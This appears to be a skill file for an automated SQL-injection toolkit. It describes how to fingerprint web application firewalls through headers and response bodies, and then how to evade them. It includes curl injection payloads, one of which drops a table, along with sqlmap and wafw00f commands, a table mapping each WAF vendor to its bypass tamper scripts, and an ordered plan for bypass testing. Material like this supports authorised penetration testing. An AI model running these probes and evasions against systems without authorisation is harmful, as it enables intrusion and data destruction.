# Skill: WAF Identification

## Metadata
- Phase: waf_evasion
- Techniques: N/A
- DB Targets: all
- Risk Level: low
- Prerequisites: target URL, initial probe done

## When to Use

Use when injection attempts return HTTP 403, 406, 429, or generic error pages instead of the expected application response. Identifying the specific WAF vendor allows selection of the most effective tamper scripts.

## Step 1: Behavioral Indicators

### HTTP Status Codes
| Code | Meaning |
|------|---------|
| 403 Forbidden | WAF block (most common) |
| 406 Not Acceptable | Content-based WAF block |
| 429 Too Many Requests | Rate limiting |
| 503 Service Unavailable | WAF challenge or capacity |
| 200 but different body | Transparent WAF block |

### Test payloads to trigger WAF
```bash
# Send simple SQL payload and observe response
curl -i "http://target.com/?id=1' OR '1'='1"
curl -i "http://target.com/?id=1 UNION SELECT 1--"
curl -i "http://target.com/?id=1; DROP TABLE test--"
```

## Step 2: Response Header Analysis

```bash
curl -I "http://target.com/" 2>/dev/null | grep -iE "(server|x-|cf-|via|set-cookie)"
```

| Header/Value | WAF Vendor |
|-------------|------------|
| `Server: cloudflare` | Cloudflare |
| `CF-RAY: *` | Cloudflare |
| `X-Cdn: Incapsula` | Imperva Incapsula |
| `X-Iinfo: *` | Imperva |
| `X-Cache: *` (Akamai pattern) | Akamai |
| `AkamaiGHost: *` | Akamai |
| `X-Sucuri-ID: *` | Sucuri |
| `X-WA-Info: *` | F5 BIG-IP ASM |
| `Set-Cookie: barra_counter_session` | Barracuda |
| `Set-Cookie: st8id` | Citrix NetScaler |

## Step 3: Response Body Analysis

```bash
curl -s "http://target.com/?id=1'" | grep -iE "(cloudflare|incapsula|sucuri|barracuda|fortiweb|akamai|modsec)"
```

| Body Pattern | WAF Vendor |
|-------------|------------|
| "Ray ID" + 16-char hex | Cloudflare |
| "Incapsula incident ID" | Imperva |
| "Reference #" | Akamai |
| "You don't have permission" + Sucuri | Sucuri |
| "Access Denied" + Barracuda | Barracuda |
| "FortiWeb" | Fortinet |
| "Web Application Firewall" + specific format | ModSecurity |

## Step 4: SQLMap Built-in Identification

```bash
sqlmap -u "http://target.com/page.php?id=1" --identify-waf --random-agent --batch -v 3
```

## Step 5: wafw00f (Dedicated Tool)

```bash
wafw00f http://target.com
wafw00f http://target.com -a   # Test all WAF fingerprints
```

## Step 6: Python Utility

```bash
python utils/waf_detector.py --target "http://target.com" --probe
```

## Identified WAF -> Tamper Strategy

| WAF | Primary Tampers | Config Profile |
|-----|----------------|----------------|
| Cloudflare | `space2comment,randomcase,charencode` | `configs/waf_cloudflare.cfg` |
| ModSecurity | `modsecurityzeroversioned,space2comment` | `configs/waf_modsecurity.cfg` |
| Imperva | `space2comment,randomcase,between` | `configs/waf_imperva.cfg` |
| F5 BIG-IP | `randomcase,charencode,space2randomblank` | (use generic WAF config) |
| Akamai | `between,randomcase,chardoubleencode` | (use generic WAF config) |
| Barracuda | `percentage,randomcase` | (use generic WAF config) |

## Bypass Testing Order

1. Test with `--random-agent` alone (bypasses basic user-agent blocks)
2. Add `--delay=2` (reduces detection from rate-based rules)
3. Add specific tampers for identified WAF
4. Chain multiple tampers
5. Try case variations manually
6. Try encoding variations manually

## Expected Output (SQLMap)
```
[WARNING] heuristic (basic) test shows that the target might be protected by some kind of WAF/IPS
[CRITICAL] sqlmap identified the following WAF/IPS:
           Cloudflare (Cloudflare Inc.)
```

## Red Flags
- No WAF identified but still getting blocked -> custom application-level input validation, not a WAF
- WAF identified but tampers don't help -> WAF uses ML-based detection, try manual payload crafting

## Follow-Up
- WAF identified -> [Tamper Selection Guide](tamper_selection_guide.md)
- WAF identified -> [WAF-specific config](../../configs/)
- Cloudflare -> [Tamper Chaining](tamper_chaining.md) with `cloudflare_chain.txt`
